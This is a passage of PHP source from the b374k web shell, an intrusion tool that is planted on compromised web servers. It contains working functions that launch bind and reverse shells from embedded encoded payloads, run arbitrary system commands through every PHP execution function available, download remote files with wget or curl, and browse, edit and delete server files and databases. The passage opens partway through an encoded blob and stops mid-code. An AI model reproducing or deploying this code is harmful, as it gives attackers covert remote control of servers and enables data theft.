Uh2WAK7EpBl0WwmgMJmKkn8o1jykPYGpKE8MsiVwZYgFIKPjMjbK3ORz/2p6sx4O+csX+ufVDPqh5896P1y9gFCQS7XO09oz/BT5X2VFEYITsAZUo86ArEgnzwy8sJBQxFQC+kwLKTJwqP3JS5N5ji4nWnxfeWSnDcL+/JJabhsi221j2TzdemGrysC0j1skx6ELXrxPV2tVsAP51uFkv9s9VgTEiFSVKWg7nsP5GRxWrBJZ2m+7en6dhnIep/D2XNRakeXXGdSCWO9dVCY25OsF1YM++HxT9J7g/4tBhE/5cXj9FH0CiMPg1fR3QKujqOpZwOIhxjtVB0CyERzSmpdjVGV4LeOjDmMq+5A9yPw1LHJJrQVq57U8rkZjvhpXyxHu3yeIjMbmZzSuizXH8UrfrWN6022DXsvl0WfrheCu8LIbO4Lj2oFivk7UuLyv8LrYKN+61Kl8OLWatEun9ne/GLRVU3u+P6LDCVQKQb9P2kVeideo0ezQ1kt3HkLOzSPwLsm4crl+usqdTz9DleT3Z2bjcMUgSn90OcdyFuSGhAZBUzo4QToIUBrkhhXXnPeDYOslO5aVswjaulqMBXtjV8Px/sLJgXXnZ/3ReLT1oh1tuoLUEPtPKX00VeHLGV2a1uWMhmWlSCFLXNafQZbMGTq9JcHhsB4O9TCkDqEascfeshdSrTL4S1ReWpWWU7SBwSiwBs0Jtgwry+9jJaxMXP5VrHyvSij1v4OXfIeXRqbgYS5feqQXsQWNaL0gYrfenEEKNpG015uT4SQAJ5vPPPjTg0CMSQwrB2bMjNpJFiEcpE39Pr7uFxEJIO2904/BHHKc+Y+C9vuA+WON2T+I2R+VkyUmPIaQFtEqod5N3BrfNPdzuje//mIj3YeMh9JWa+aQdKIH1g5+l8E/YzWIIcoUyk35fRxxleX+upD5TxHIEoIE3bFCquoba+PjxSDR2E8iW67wCRsYoMosoCJ8/E1BztL6kgk+vvVGQ/zi9wCpOlR3WYpIjXRE6jQzZSNaquus8MU2TzTkxPhJmLkmkc4eYMtvrNKnJz0WtrrEFjq/a3VPT0Yt8SWSBjXfKtetNyZssK8wVKhs9a88W3GgBNSznNivOho+mEJohng786Q+a9mJ044gem7BxBQmTBuMZozd4nvKbuvQta229RV4tJU9Tumwym7r+bycFzyFRPV6HeAX88X2J10igO63XCyAjVafNV3BE/VdlxDe5KR0Biox3uov6q6A24fb8fArM5zMO4sA3GQqw73+OTiSwEkjxalSQlPwlEigqNs9oJf+pvI4jY4qau0R8oJilcRQWjY/rUsvIpsKGnp6P9v6GiXmdYDrb6+TYL8Gt1Io9AgOOygUEg02lwwQwcqmKY9wYWnFQYFNNe0G3n0Wh50qkm6dQu+xkS1fCWb2PXbS9TKQeTOTrp5KwfTuyVbUBHgVOrwT/wU=";

// make link for folder $cwd and all of its parent folder
function swd($p){
	global $s_self;
	$ps = explode(DIRECTORY_SEPARATOR,$p);
	$pu = "";
	for($i = 0 ; $i < sizeof($ps)-1 ; $i++){
		$pz = "";
		for($j = 0 ; $j <= $i ; $j++) $pz .= $ps[$j].DIRECTORY_SEPARATOR;
		$pu .= "<a href='".$s_self."cd=".$pz."'>".$ps[$i]." ".DIRECTORY_SEPARATOR." </a>";
	}
	return trim($pu);
}
// htmlspecialchars, < > "
function hss($t){
	$n = array(">","<","\"");
	$y = array("&gt;", "&lt;", "&quot;");
	return str_replace($n,$y,$t);
}
// remove <br />tags
function rp($t){
	return trim(str_replace("<br />","",$t));
}
// replace spaces with underscore ( _ )
function cs($t){
	return str_replace(" ","_",$t);
}
// strip slashes,trim and urldecode
function ss($t){
	return (!get_magic_quotes_gpc())? trim(urldecode($t)) : trim(urldecode(stripslashes($t)));
}
// only strip slashes
function ssc($t){
	return (!get_magic_quotes_gpc())? trim($t) : trim(stripslashes($t));
}
// bind and reverse shell
function rs($rstype,$rstarget,$rscode){
	//bind_pl bind_py bind_rb bind_c bind_win bind_php back_pl back_py back_rb back_c back_win back_php
	//resources $rs_pl $rs_py $rs_rb $rs_c $rs_win $rs_php
	$result = "";
	$fpath = "";
	$fc = gzinflate(base64_decode($rscode));

	$errperm = "Directory ".getcwd().DIRECTORY_SEPARATOR." is not writable, please change to a writable one";
	$errgcc = "Unable to compile using gcc";

	$split = explode("_",$rstype);
	$method = $split[0];
	$lang = $split[1];
	if($lang=="py" || $lang=="pl" || $lang=="rb"){
		if($lang=="py") $runlang = "python";
		elseif($lang=="pl") $runlang = "perl";
		elseif($lang=="rb") $runlang = "ruby";
		$fpath = "b374k_rs.".$lang;
		if(is_file($fpath)) unlink($fpath);
		if($file=fopen($fpath,"w")){
			fwrite($file,$fc);
			fclose($file);
			if(is_file($fpath)){
				$result = exe("chmod +x ".$fpath);
				$result = exe($runlang." ".$fpath." ".$rstarget);
			}
			else $result = $errperm;
		}
		else $result = $errperm;
	}
	elseif($lang=="c"){
		$fpath = "b374k_rs";
		if(is_file($fpath)) unlink($fpath);
		if(is_file($fpath.".c")) unlink($fpath.".c");
		if($file=fopen($fpath.".c","w")){
			fwrite($file,$fc);
			fclose($file);
			if(is_file($fpath.".c")){
				$result = exe("gcc ".$fpath.".c -o ".$fpath);
				if(is_file($fpath)){
					$result = exe("chmod +x ".$fpath);
					$result = exe("./".$fpath." ".$rstarget);
				}
				else $result = $errgcc;
			}
			else $result = $errperm;
		}
		else $result = $errperm;
	}
	elseif($lang=="win"){
		$fpath = "b374k_rs.exe";
		if(is_file($fpath)) unlink($fpath);
		if($file=fopen($fpath,"w")){
			fwrite($file,$fc);
			fclose($file);
			if(is_file($fpath)){
				$result = exe($fpath." ".$rstarget);
			}
			else $result = $errperm;
		}
		else $result = $errperm;
	}
	elseif($lang=="php"){
		$result = eval("?>".$fc);
	}
	if(is_file($fpath)) unlink($fpath);
	if(is_file($fpath.".c")) unlink($fpath.".c");
	return $result;
}
// format bit 
function ts($s){
	if($s<=0) return 0;
	$w = array('B','KB','MB','GB','TB','PB','EB','ZB','YB');
	$e = floor(log($s)/log(1024));
	return sprintf('%.2f '.$w[$e], ($s/pow(1024, floor($e))));
}
// get file size
function gs($f){
	$s = @filesize($f);
	if($s !== false){
		if($s<=0) return 0;
		return ts($s);
	}
	else return "???";
}
// get file permissions
function gp($f){
	if($m=@fileperms($f)){
		$p = 'u';
		if(($m & 0xC000) == 0xC000)$p = 's';
		elseif(($m & 0xA000) == 0xA000)$p = 'l';
		elseif(($m & 0x8000) == 0x8000)$p = '-';
		elseif(($m & 0x6000) == 0x6000)$p = 'b';
		elseif(($m & 0x4000) == 0x4000)$p = 'd';
		elseif(($m & 0x2000) == 0x2000)$p = 'c';
		elseif(($m & 0x1000) == 0x1000)$p = 'p';
		$p .= ($m & 00400) ? 'r' : '-';
		$p .= ($m & 00200) ? 'w' : '-';
		$p .= ($m & 00100) ? 'x' : '-';
		$p .= ($m & 00040) ? 'r' : '-';
		$p .= ($m & 00020) ? 'w' : '-';
		$p .= ($m & 00010) ? 'x' : '-';
		$p .= ($m & 00004) ? 'r' : '-';
		$p .= ($m & 00002) ? 'w' : '-';
		$p .= ($m & 00001) ? 'x' : '-';
		return $p;
	}
	else return "???????????";
}
// shell command
function exe($c){
	$out = "";
	$c = $c." 2>&1";

	if(is_callable('system')) {
		ob_start();
		@system($c);
		$out = ob_get_contents();
		ob_end_clean();
		if(!empty($out)) return $out;
	}
	if(is_callable('shell_exec')){
		$out = @shell_exec($c);
		if(!empty($out)) return $out;
	}
	if(is_callable('exec')) {
		@exec($c,$r);
		if(!empty($r)) foreach($r as $s) $out .= $s;
		if(!empty($out)) return $out;
	}
	if(is_callable('passthru')) {
		ob_start();
		@passthru($c);
		$out = ob_get_contents();
		ob_end_clean();
		if(!empty($out)) return $out;
	}
	if(is_callable('proc_open')) {
		$descriptorspec = array(
		0 => array("pipe", "r"),
		1 => array("pipe", "w"),
		2 => array("pipe", "w")
		);
		$proc = @proc_open($c, $descriptorspec, $pipes, getcwd(), array());
		if (is_resource($proc)) {
			while ($si = fgets($pipes[1])) {
				if(!empty($si)) $out .= $si;
			}
			while ($se = fgets($pipes[2])) {
				if(!empty($se)) $out .= $se;
			}
		}
		@proc_close($proc);
		if(!empty($out)) return $out;
	}
	if(is_callable('popen')){
		$f = @popen($c, 'r');
		if($f){
			while(!feof($f)){
				$out .= fread($f, 2096);
			}
			pclose($f);
		}
		if(!empty($out)) return $out;
	}
	return "";
}
// add slash to the end of given path
function cp($p){
	if(is_dir($p)){
		$x = DIRECTORY_SEPARATOR;
		while(substr($p,-1) == $x) $p = rtrim($p,$x);
		return $p.$x;
	}
	return $p;
}
// delete dir and all of its content (no warning !) xp
function rmdirs($d){
	$f = glob($d . '*', GLOB_MARK);
	foreach($f as $z){
		if(is_dir($z)) rmdirs($z);
		else unlink($z);
	}
	if(is_dir($d)) rmdir($d);
}
// get array of all files from given directory
function getallfiles($dir){
    $f = glob($dir . '*');
	for($i = 0; $i < count($f); $i++){
		if(is_dir($f[$i])) {
			$a = glob($f[$i].DIRECTORY_SEPARATOR.'*');
			$f = array_merge($f, $a);
		}
	}
    return $f;
}
// which command
function xwhich($pr){
	$p = exe("which $pr");
	if(trim($p)!="") { return trim($p); } else { return trim($pr); }
}
// download file from internet
function dlfile($u,$p){
	$n = basename($u);

	// try using php functions
	if($t = @file_get_contents($u)){
		if(is_file($p)) unlink($p);;
		if($f=fopen($p,"w")){
			fwrite($f,$t);
			fclose($f);
			if(is_file($p)) return true;
		}
	}
	// using wget
	exe(xwhich('wget')." ".$u." -O ".$p);
	if(is_file($p)) return true;

	// try using lwp-download
	exe(xwhich('lwp-download')." ".$u." ".$p);
	if(is_file($p)) return true;

	// try using lynx
	exe(xwhich('lynx')." -source ".$u." > ".$p);
	if(is_file($p)) return true;

	// try using curl
	exe(xwhich('curl')." ".$u." -o ".$p);
	if(is_file($p)) return true;

	return false;
}
// find writable dir
function get_writabledir(){
	if(is_writable(".")) $d = ".".DIRECTORY_SEPARATOR;
	else{
		if(!$d = getenv("TMP")) if(!$d = getenv("TEMP")) if(!$d = getenv("TMPDIR")){
			if(is_writable("/tmp")) $d = "/tmp/";
			else $d = getcwd().DIRECTORY_SEPARATOR;
		}
	}
	return $d;
}
// zip function
function zip($src, $dest){
	if(!extension_loaded('zip') || !file_exists($src)) return false;

	if(class_exists("ZipArchive")){
		$zip = new ZipArchive();
		if(!$zip->open($dest, 1)) return false;

		$src = str_replace('\\', '/', $src);
		if(is_dir($src)){
			$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($src), 1);
			foreach($files as $file){
				$file = str_replace('\\', '/', $file);
				if(in_array(substr($file, strrpos($file, '/')+1), array('.', '..'))) continue;
				if (is_dir($file) === true)	$zip->addEmptyDir(str_replace($src . '/', '', $file . '/'));
				else if (is_file($file) === true) $zip->addFromString(str_replace($src . '/', '', $file), @file_get_contents($file));
			}
		}
		elseif(is_file($src) === true) $zip->addFromString(basename($src), @file_get_contents($src));
		$zip->close();
		return true;
	}
}
// check shell permission to access program
function check_access($lang){
	$s = 0;
	switch($lang){
		case "python":
			$cek = strtolower(exe("python -h"));
			if(strpos($cek,"usage")!==false) $s = 1;
			break;
		case "perl":
			$cek = strtolower(exe("perl -h"));
			if(strpos($cek,"usage")!==false) $s = 1;
			break;
		case "ruby":
			$cek = strtolower(exe("ruby -h"));
			if(strpos($cek,"usage")!==false) $s = 1;
			break;
		case "gcc":
			$cek = strtolower(exe("gcc --help"));
			if(strpos($cek,"usage")!==false) $s = 1;
			break;
		case "tar":
			$cek = strtolower(exe("tar --help"));
			if(strpos($cek,"usage")!==false) $s = 1;
			break;
		case "java":
			$cek = strtolower(exe("javac --help"));
			if(strpos($cek,"usage")!==false){
				$cek = strtolower(exe("java -h"));
				if(strpos($cek,"usage")!==false) $s = 1;
			}
			break;
	}
	return $s;
}
// find available archiver
function get_archiver_available(){
	global $s_self, $s_tar;
	$dlfile = "";
	$avail_arc = array("raw"=>"raw");

	if(class_exists("ZipArchive")){
		$avail_arc["ziparchive"] = "zip";
	}
	if($s_tar){
		$avail_arc["tar"] = "tar";
		$avail_arc["targz"] = "tar.gz";
	}

	$option_arc = "";
	foreach($avail_arc as $t=>$u){
		$option_arc .= "<option value=\"".$t."\">".$u."</option>";
	}

	$dlfile .= "<form action='".$s_self."' method='post'>
				<select onchange='download(this);' name='dltype' class='inputzbut' style='width:80px;height:20px;'>
				<option value='' disabled selected>Download</option>
				".$option_arc."
				</select>
				<input type='hidden' name='dlpath' value='__dlpath__' />
				</form>
				";
	return $dlfile;
}
// explorer, return a table of given dir
function showdir($cwd){
	global $s_self;

	$posix = (function_exists("posix_getpwuid") && function_exists("posix_getgrgid"))? true : false;
	$win = (strtolower(substr(php_uname(),0,3)) == "win")? true : false;

	$fname = array();
	$dname = array();

	if(function_exists("scandir") && $dh = @scandir($cwd)){
		foreach($dh as $file){
			if(is_dir($file)) $dname[] = $file;
			elseif(is_file($file)) $fname[] = $file;
		}
	}
	else{
		if($dh = @opendir($cwd)){
			while($file = readdir($dh)){
				if(is_dir($file)) $dname[] = $file;
				elseif(is_file($file))$fname[] = $file;
			}
			closedir($dh);
		}
	}

	sort($fname);
	sort($dname);
	$list = array_merge($dname,$fname);

	if($win){
		//check if this root directory
		chdir("..");
		if(cp(getcwd())==cp($cwd)){
			array_unshift($list, ".");
		}
		chdir($cwd);
	}

	$path = explode(DIRECTORY_SEPARATOR,$cwd);
	$tree = sizeof($path);

	$parent = "";
	if($tree > 2) for($i=0;$i<$tree-2;$i++) $parent .= $path[$i].DIRECTORY_SEPARATOR;
	else $parent = $cwd;

	$owner_html = (!$win && $posix) ? "<th style='width:120px;'>owner:group</th>" : "";
	$buff = "
	<table class='explore sortable'>
	<tr><th>name</th><th style='width:60px;'>size</th>".$owner_html."<th style='width:70px;'>perms</th><th style='width:110px;'>modified</th><th style='width:180px;' class='sorttable_nosort'>action</th><th style='width:90px;' class='sorttable_nosort'>download</th></tr>
	";

	$arc = get_archiver_available();
	foreach($list as $l){
		if(!$win && $posix){
			$name = posix_getpwuid(fileowner($l));
			$group = posix_getgrgid(filegroup($l));
			$owner = $name['name']."<span class='gaya'>:</span>".$group['name'];
			$owner_html = "<td style='text-align:center;'>".$owner."</td>";
		}

		$lhref = "";
		$lname = "";
		$laction = "";
		if(is_dir($l)){
			if($l=="."){
				$lhref = $s_self."cd=".$cwd;
				$lsize = "LINK";
				$laction = "
				<span id='titik1'>
					<a href='".$s_self."cd=".$cwd."&find=".$cwd."' title='find something'>find</a> |
					<a href='".$s_self."cd=".$cwd."&upload' title='upload'>upl</a> |
					<a href='".$s_self."cd=".$cwd."&edit=".$cwd."newfile_1&new' title='create new file'>+file</a> |
					<a href=\"javascript:tukar('titik1','titik1_form');\" title='create new directory'>+dir</a>
				</span>
				<div id='titik1_form' class='sembunyi'>
					<form action='".$s_self."' method='post'>
					<input type='hidden' name='cd' value=".$cwd."' />
					<input class='inputz' id='titik1_' style='width:80px;' type='text' name='mkdir' value='newfolder' />
					<input class='inputzbut' type='submit' name='rename' style='width:35px;' value='Go !' />
					</form>
					<input class='inputzbut' type='button' value='x' onclick=\"tukar('titik1_form','titik1');\" />
				</div>";
			}
			elseif($l==".."){
				$lhref = $s_self."cd=".$parent;
				$lsize = "LINK";
				$laction = "
				<span id='titik2'>
					<a href='".$s_self."cd=".$parent."&find=".$parent."' title='find something'>find</a> |
					<a href='".$s_self."cd=".$parent."&upload' title='upload'>upl</a> |
					<a href='".$s_self."cd=".$parent."&edit=".$parent."newfile_1&new' title='create new file'>+file</a> |
					<a href=\"javascript:tukar('titik2','titik2_form');\" title='create new directory'>+dir</a>
				</span>
				<div id='titik2_form' class='sembunyi'>
					<form action='".$s_self."' method='post'>
					<input type='hidden' name='cd' value='".$parent."' />
					<input class='inputz' id='titik2_' style='width:80px;' type='text' name='mkdir' value='newfolder' />
					<input class='inputzbut' type='submit' name='rename' style='width:35px;' value='Go !' />
					</form>
					<input class='inputzbut' type='button' value='x' onclick=\"tukar('titik2_form','titik2');\" />
				</div>";
			}
			else{
				$lhref = $s_self."cd=".$cwd.$l.DIRECTORY_SEPARATOR;
				$lsize = "DIR";
				$laction = "
				<span id='".cs($l)."_link'>
					<a href='".$s_self."cd=".$cwd.$l.DIRECTORY_SEPARATOR."&find=".$cwd.$l.DIRECTORY_SEPARATOR."' title='find something'>find</a> |
					<a href='".$s_self."cd=".$cwd.$l.DIRECTORY_SEPARATOR."&upload' title='upload'>upl</a> |
					<a href=\"javascript:tukar('".cs($l)."_link','".cs($l)."_form');\" title='rename'>ren</a> |
					<a href='".$s_self."cd=".$cwd."&del=".$l."' title='delete'>del</a>
				</span>
				<div id='".cs($l)."_form' class='sembunyi'>
					<form action='".$s_self."' method='post'>
					<input type='hidden' name='oldname' value='".$l."' />
					<input type='hidden' name='cd' value='".$cwd."' />
					<input class='inputz' style='width:80px;' type='text' id='".cs($l)."_link_' name='newname' value='".$l."' />
					<input class='inputzbut' type='submit' name='rename' value='ren' />
					</form>
					<input class='inputzbut' type='button' value='x' onclick=\"tukar('".cs($l)."_form','".cs($l)."_link');\" />
				</div>";
			}
			$lname = "[ ".$l." ]";
			$lsizetit = "0";
		}
		else{
			$lhref = $s_self."view=".$l;
			$lname = $l;
			$lsize = gs($l);
			$lsizetit = @filesize($l);
			$laction = "
			<div id='".cs($l)."_form' class='sembunyi'>
				<form action='".$s_self."' method='post'>
				<input type='hidden' name='oldname' value='".$l."' />
				<input class='inputz' style='width:80px;' type='text' id='".cs($l)."_link_' name='newname' value='".$l."' />
				<input class='inputzbut' type='submit' name='rename' value='ren' />
				</form>
				<input class='inputzbut' type='button' value='x' onclick=\"tukar('".cs($l)."_form','".cs($l)."_link');\" />
			</div>
			<span id='".cs($l)."_link'>
				<a href='".$s_self."edit=".cs($cwd.$l)."' title='edit'>edit</a> |
				<a href='".$s_self."hexedit=".cs($cwd.$l)."' title='edit as hex'>hex</a> |
				<a href=\"javascript:tukar('".cs($l)."_link','".cs($l)."_form');\" title='rename'>ren</a> |
				<a href='".$s_self."del=".$l."' title='delete'>del</a>
			</span>";
		}

		$ldl = str_replace("__dlpath__",$l,$arc);
		$buff .= "
		<tr>
		<td class='explorelist' onmouseup=\"return go('".addslashes($lhref)."',event);\">
			<a href='".$lhref."'>".$lname."</a>
		</td>
		<td title='".$lsizetit."'>".$lsize."</td>
		".$owner_html."
		<td style='text-align:center;'>".gp($l)."</td>
		<td style='text-align:center;'>".@date("d-M-Y H:i",filemtime($l))."</td>
		<td>".$laction."</td>
		<td>".$ldl."</td></tr>";
	}
	$buff .= "</table>";
	return $buff;
}
//database related functions
function sql_connect($sqltype, $sqlhost, $sqluser, $sqlpass){
	if($sqltype == 'mysql'){if(function_exists('mysql_connect')) return @mysql_connect($sqlhost,$sqluser,$sqlpass);}
	elseif($sqltype == 'mssql'){
		if(function_exists('mssql_connect')) return @mssql_connect($sqlhost,$sqluser,$sqlpass);
		elseif(function_exists('sqlsrv_connect')){
			$coninfo = array("UID"=>$sqluser, "PWD"=>$sqlpass);
			return @sqlsrv_connect($sqlhost,$coninfo);
		}
	}
	elseif($sqltype == 'pgsql'){
		$hosts = explode(":", $sqlhost);
		if(count($hosts)==2){
			$host_str = "host=".$hosts[0]." port=".$hosts[1];
		}
		else $host_str = "host=".$sqlhost;
		if(function_exists('pg_connect')) return @pg_connect("$host_str user=$sqluser password=$sqlpass");
	}
	elseif($sqltype == 'oracle'){if(function_exists('oci_connect')) return @oci_connect($sqluser,$sqlpass,$sqlhost);}
	elseif($sqltype == 'sqlite3'){
		if(class_exists('SQLite3')) if(!empty($sqlhost)) return new SQLite3($sqlhost);
		else return false;
	}
	elseif($sqltype == 'sqlite'){if(function_exists('sqlite_open')) return @sqlite_open($sqlhost);}
	elseif($sqltype == 'odbc'){if(function_exists('odbc_connect')) return @odbc_connect($sqlhost,$sqluser,$sqlpass);}
	elseif($sqltype == 'pdo'){
		if(class_exists('PDO')) if(!empty($sqlhost)) return new PDO($sqlhost,$sqluser,$sqlpass);
		else return false;
	}
}
function sql_query($sqltype, $query, $con){
	if($sqltype == 'mysql'){if(function_exists('mysql_query')) return mysql_query($query);}
	elseif($sqltype == 'mssql'){
		if(function_exists('mssql_query')) return mssql_query($query);
		elseif(function_exists('sqlsrv_query')) return sqlsrv_query($con,$query);
	}
	elseif($sqltype == 'pgsql'){if(function_exists('pg_query')) return pg_query($query);}
	elseif($sqltype == 'oracle'){
		if(function_exists('oci_parse') && function_exists('oci_execute')){
			$st = oci_parse($con, $query);
			oci_execute($st);
			return $st;
		}
	}
	elseif($sqltype == 'sqlite3'){if(class_exists('SQLite3')) return $con->query($query);}
	elseif($sqltype == 'sqlite'){if(function_exists('sqlite_query')) return sqlite_query($con, $query);}
	elseif($sqltype == 'odbc'){if(function_exists('odbc_exec')) return odbc_exec($con, $query);}
	elseif($sqltype == 'pdo'){if(class_exists('PDO')) return $con->query($query);}
}
function sql_num_fields($sqltype, $hasil){
	if($sqltype == 'mysql'){if(function_exists('mysql_num_fields')) return mysql_num_fields($hasil);}
	elseif($sqltype == 'mssql'){
		if(function_exists('mssql_num_fields')) return mssql_num_fields($hasil);
		elseif(function_exists('sqlsrv_num_fields')) return sqlsrv_num_fields($hasil);
	}
	elseif($sqltype == 'pgsql'){if(function_exists('pg_num_fields')) return pg_num_fields($hasil);}
	elseif($sqltype == 'oracle'){if(function_exists('oci_num_fields')) return oci_num_fields($hasil);}
	elseif($sqltype == 'sqlite3'){if(class_exists('SQLite3')) return $hasil->numColumns();}
	elseif($sqltype == 'sqlite'){if(function_exists('sqlite_num_fields')) return sqlite_num_fields($hasil);}
	elseif($sqltype == 'odbc'){if(function_exists('odbc_num_fields')) return odbc_num_fields($hasil);}
	elseif($sqltype == 'pdo'){if(class_exists('PDO')) return $hasil->columnCount();}
}
function sql_field_name($sqltype,$hasil,$i){
	if($sqltype == 'mysql'){if(function_exists('mysql_field_name')) return mysql_field_name($hasil,$i);}
	elseif($sqltype == 'mssql'){
		if(function_exists('mssql_field_name')) return mssql_field_name($hasil,$i);
		elseif(function_exists('sqlsrv_field_metadata')){
			$metadata = sqlsrv_field_metadata($hasil);
			if(is_array($metadata)){
				$metadata=$metadata[$i];
			}
			if(is_array($metadata)) return $metadata['Name'];
		}
	}
	elseif($sqltype == 'pgsql'){if(function_exists('pg_field_name')) return pg_field_name($hasil,$i);}
	elseif($sqltype == 'oracle'){if(function_exists('oci_field_name')) return oci_field_name($hasil,$i+1);}
	elseif($sqltype == 'sqlite3'){if(class_exists('SQLite3')) return $hasil->columnName($i);}
	elseif($sqltype == 'sqlite'){if(function_exists('sqlite_field_name')) return sqlite_field_name($hasil,$i);}
	elseif($sqltype == 'odbc'){if(function_exists('odbc_field_name')) return odbc_field_name($hasil,$i+1);}
	elseif($sqltype == 'pdo'){
		if(class_exists('PDO')){
			$res = $hasil->getColumnMeta($i);
			return $res['name'];
		}
	}
}
function sql_fetch_data($sqltype,$hasil){
	if($sqltype == 'mysql'){if(function_exists('mysql_fetch_row')) return mysql_fetch_row($hasil);}
	elseif($sqltype == 'mssql'){
		if(function_exists('mssql_fetch_row')) return mssql_fetch_row($hasil);
		elseif(function_exists('sqlsrv_fetch_array')) return sqlsrv_fetch_array($hasil,1);
	}
	elseif($sqltype == 'pgsql'){if(function_exists('pg_fetch_row')) return pg_fetch_row($hasil);}
	elseif($sqltype == 'oracle'){if(function_exists('oci_fetch_row')) return oci_fetch_row($hasil);}
	elseif($sqltype == 'sqlite3'){if(class_exists('SQLite3')) return $hasil->fetchArray(1);}
	elseif($sqltype == 'sqlite'){if(function_exists('sqlite_fetch_array')) return sqlite_fetch_array($hasil,1);}
	elseif($sqltype == 'odbc'){if(function_exists('odbc_fetch_array')) return odbc_fetch_array($hasil);}
	elseif($sqltype == 'pdo'){if(class_exists('PDO')) return $hasil->fetch(2);}
}
function sql_num_rows($sqltype,$hasil){
	if($sqltype == 'mysql'){if(function_exists('mysql_num_rows')) return mysql_num_rows($hasil);}
	elseif($sqltype == 'mssql'){
		if(function_exists('mssql_num_rows')) return mssql_num_rows($hasil);
		elseif(function_exists('sqlsrv_num_rows')) return sqlsrv_num_rows($hasil);
	}
	elseif($sqltype == 'pgsql'){if(function_exists('pg_num_rows')) return pg_num_rows($hasil);}
	elseif($sqltype == 'oracle'){if(function_exists('oci_num_rows')) return oci_num_rows($hasil);}
	elseif($sqltype == 'sqlite3'){
		if(class_exists('SQLite3')){
			$metadata = $hasil->fetchArray();
			if(is_array($metadata)) return $metadata['count'];
		}
	}
	elseif($sqltype == 'sqlite'){if(function_exists('sqlite_num_rows')) return sqlite_num_rows($hasil);}
	elseif($sqltype == 'odbc'){if(function_exists('odbc_num_rows')) return odbc_num_rows($hasil);}
	elseif($sqltype == 'pdo'){if(class_exists('PDO')) return $hasil->rowCount();}
}
function sql_close($sqltype,$con){
	if($sqltype == 'mysql'){if(function_exists('mysql_close')) return mysql_close($con);}
	elseif($sqltype == 'mssql'){
		if(function_exists('mssql_close')) return mssql_close($con);
		elseif(function_exists('sqlsrv_close')) return sqlsrv_close($con);
	}
	elseif($sqltype == 'pgsql'){if(function_exists('pg_close')) return pg_close($con);}
	elseif($sqltype == 'oracle'){if(function_exists('oci_close')) return oci_close($con);}
	elseif($sqltype == 'sqlite3'){if(class_exists('SQLite3')) return $con->close();}
	elseif($sqltype == 'sqlite'){if(function_exists('sqlite_close')) return sqlite_close($con);}
	elseif($sqltype == 'odbc'){if(function_exists('odbc_close')) return odbc_close($con);}
	elseif($sqltype == 'pdo'){if(class_exists('PDO')) return $con = null;}
}
if(!function_exists('str_split')){
	function str_split($t,$s=1){
		$a = array();
		for($i=0;$i<strlen($t);){
			$a[] = substr($t,$i,$s);
			$i += $s;
		}
		return $a;
	}
}

// favicon
if(isset($_REQUEST['favicon'])){
	$data = gzinflate(base64_decode($favicon));
	header("Content-type: image/png");
	header("Cache-control: public");
	echo $data;
	exit;
}

global $s_self;
$s_self = "?";

$cek1 = basename($_SERVER['SCRIPT_FILENAME']);
$cek2 = substr(basename(__FILE__),0,strlen($cek1));;

if(isset($_COOKIE['b374k_included'])){
	if(strcmp($cek1,$cek2)!=0) $s_self = $_COOKIE['s_self'];
	else{
		$s_self = "?";
		setcookie("b374k_included", "0" ,time() - $s_login_time);
		setcookie("s_self", $s_self ,time() + $s_login_time);
	}
}
else{
	if(strcmp($cek1,$cek2)!=0){
		if(!isset($_COOKIE['s_home'])){
			$s_home = "?".$_SERVER["QUERY_STRING"]."&";
			setcookie("s_home", $s_home ,time() + $s_login_time);
		}
		if(isset($s_home)) $s_self = $s_home;
		elseif(isset($_COOKIE['s_home'])) $s_self = $_COOKIE['s_home'];
		setcookie("b374k_included", "1" ,time() + $s_login_time);
		setcookie("s_self", $s_self ,time() + $s_login_time);
	}
	else{
		$s_self = "?";
		setcookie("b374k_included", "0" ,time() - $s_login_time);
		setcookie("s_self", $s_self ,time() + $s_login_time);
	}
}

if($s_auth){
	// server software
	$s_software = getenv("SERVER_SOFTWARE");
	// uname -a
	$s_system = php_uname();
	// check os
	$s_win = (strtolower(substr($s_system,0,3)) == "win")? true : false;
	// change working directory
	if(isset($_REQUEST['cd'])){
		$dd = ss($_REQUEST['cd']);
		if(is_dir($dd)){
			$cwd = cp($dd);
			chdir($cwd);
			setcookie("cwd", $cwd ,time() + $s_login_time);
		}
	}
	else{
		if(isset($_COOKIE['cwd'])){
			$dd = ss($_COOKIE['cwd']);
			if(is_dir($dd)){
				$cwd = cp($dd);
				chdir($cwd);
			}
		}
		else $cwd = cp(getcwd());
	}
	// get path and all drives available
	$letters = '';
	if(!$s_win){
		if(!$s_user = rp(exe("whoami"))) $s_user = "";
		if(!$s_id = rp(exe("id"))) $s_id = "";
	}
	else {
		$s_user = get_current_user();
		$s_id = $s_user;
		// find drive letters
	 	$v = explode("\\",$cwd);
		$v = $v[0];
		foreach (range("A","Z") as $letter){
			if(is_dir($letter.":\\") && is_readable($letter.":\\")){
				$letters .= "<a href='".$s_self."cd=".$letter.":\\'>[ ";
				if ($letter.":" != $v) {$letters .= $letter;}
				else {$letters .= "<span style='color:#fff;'>".$letter."</span>";}
				$letters .= " ]</a> ";
			}
		}
	}
	// prompt style..
	$s_prompt = $s_user." &gt;";
	// check for posix
	$s_posix = (function_exists("posix_getpwuid") && function_exists("posix_getgrgid"))? true : false;
	// server ip
	$s_server_ip = gethostbyname($_SERVER["HTTP_HOST"]);
	// your ip ;-)
	$s_my_ip = $_SERVER['REMOTE_ADDR'];
	$s_result = "";

	global $s_python, $s_perl, $s_ruby, $s_gcc, $s_java, $s_tar;
	// check python
	if(isset($_COOKIE['s_python'])){$s_python = $_COOKIE['s_python'];}
	else{
		$s_python = check_access("python");
		setcookie("s_python", $s_python ,time() + $s_login_time);
	}
	$s_python = ($s_python=="1")?true:false;

	// check perl
	if(isset($_COOKIE['s_perl'])){$s_perl = $_COOKIE['s_perl'];}
	else{
		$s_perl = check_access("perl");
		setcookie("s_perl", $s_perl ,time() + $s_login_time);
	}
	$s_perl = ($s_perl=="1")?true:false;

	// check ruby
	if(isset($_COOKIE['s_ruby'])){$s_ruby = $_COOKIE['s_ruby'];}
	else{
		$s_ruby = check_access("ruby");
		setcookie("s_ruby", $s_ruby ,time() + $s_login_time);
	}
	$s_ruby = ($s_ruby=="1")?true:false;

	// check gcc
	if(isset($_COOKIE['s_gcc'])){$s_gcc = $_COOKIE['s_gcc'];}
	else{
		$s_gcc = check_access("gcc");
		setcookie("s_gcc", $s_gcc ,time() + $s_login_time);
	}
	$s_gcc = ($s_gcc=="1")?true:false;

	// check java
	if(isset($_COOKIE['s_java'])){$s_java = $_COOKIE['s_java'];}
	else{
		$s_java = check_access("java");
		setcookie("s_java", $s_java ,time() + $s_login_time);
	}
